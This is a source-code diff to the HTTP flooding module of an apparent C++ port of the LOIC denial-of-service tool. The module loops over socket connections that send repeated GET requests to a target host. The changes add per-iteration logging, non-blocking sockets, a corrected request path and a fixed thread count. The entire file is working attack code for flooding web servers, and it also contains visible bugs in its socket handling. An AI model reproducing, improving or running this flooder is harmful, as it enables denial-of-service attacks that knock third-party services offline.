@@ -7,12 +7,14 @@
 
 
 #include "HTTPFlooder.h"
+
 namespace loic {
 
 	void HTTPFlooder::work()
 	{
 		try
 		{
+			int i = 0;
 			while(this->isFlooding())
 			{
 				this->state = readyState;
@@ -23,11 +25,12 @@ namespace loic {
 				if((socketHandle = socket(AF_INET,SOCK_STREAM,IPPROTO_IP)<0)){
 
 					close(socketHandle);
-					std::cerr<<"ERROR"<<std::endl;
+					std::cerr<<i<<" couldn't create socket socket"<<std::endl;
 				}
 
 				this->state = connectingState;
 
+				fcntl(socketHandle,F_SETFL,O_NONBLOCK);
 
 
 				/* socket work */
@@ -45,8 +48,8 @@ namespace loic {
 					struct hostent *hPtr;
 					if((hPtr = gethostbyname(remoteHost.c_str())) == NULL)
 					{
-						std::cerr<<"System DNS name resolution not configured properly."<<std::endl;
-						std::cerr<<"Error number: "<< ECONNREFUSED<<std::endl;
+						std::cerr<<i<<" System DNS name resolution not configured properly."<<std::endl;
+						std::cerr<<i<<" Error number: "<< ECONNREFUSED<<std::endl;
 
 					}
 
@@ -64,7 +67,7 @@ namespace loic {
 				if((connect(socketHandle, (struct sockaddr *)&remoteSocketInfo, sizeof(sockaddr_in)))<0)
 				{
 					close(socketHandle);
-					std::cerr<<"could not connect socket\n";
+					std::cerr<<i<<" could not connect socket\n";
 
 				}
 
@@ -73,7 +76,7 @@ namespace loic {
 				//socket send
 				char buf[512];
 				std::stringstream stream("");
-				stream<<"GET "<<this->subsite<<" HTTP/1.0\n\n\n";
+				stream<<"GET /"<<this->subsite<<" HTTP/1.0\n\n\n";
 				strcpy(buf,stream.str().c_str());
 				send(socketHandle,buf,strlen(buf)+1,0);
 
@@ -88,12 +91,18 @@ namespace loic {
 					int rc  = recv(socketHandle, &recvBuf, 64,0);  //0 for no flags
 					if(rc == 0)
 					{
-						std::cerr<<"ERROR! Socket closed"<<std::endl;
+						std::cerr<<i<<" ERROR! Socket closed"<<std::endl;
 					}
 					else if(rc == -1)
 					{
-						std::cerr<<"ERROR! Socket error"<<std::endl;
+						std::cerr<<i<<" ERROR! Socket error"<<std::endl;
 						close(socketHandle);
+					}
+					else
+					{
+						//successfull
+						std::cout<<recvBuf<<std::endl;
+
 					}
 
 				}
@@ -106,6 +115,7 @@ namespace loic {
 				{
 					boost::this_thread::sleep(boost::posix_time::milliseconds(delay));
 				}
+				i++;
 			}
 		}
 		catch(std::exception & exe)
@@ -126,6 +136,7 @@ namespace loic {
 				flooding = false;
 				this->failed++;
 				this->state = failedState;
+				std::cerr<<"Error! TIMED OUT\n";
 			}
 			boost::this_thread::sleep(boost::posix_time::milliseconds(100));
 		}
@@ -138,7 +149,8 @@ namespace loic {
 		//can use bind as well
 		boost::thread t(&loic::HTTPFlooder::checkTimeOut,this);
 
-		for(unsigned int i = 0; i<boost::thread::hardware_concurrency();i++)
+		unsigned int numThreads = 1;
+		for(unsigned int i = 0; i<numThreads;i++)
 		{
 			boost::thread thread(&loic::HTTPFlooder::work,this);
 		}
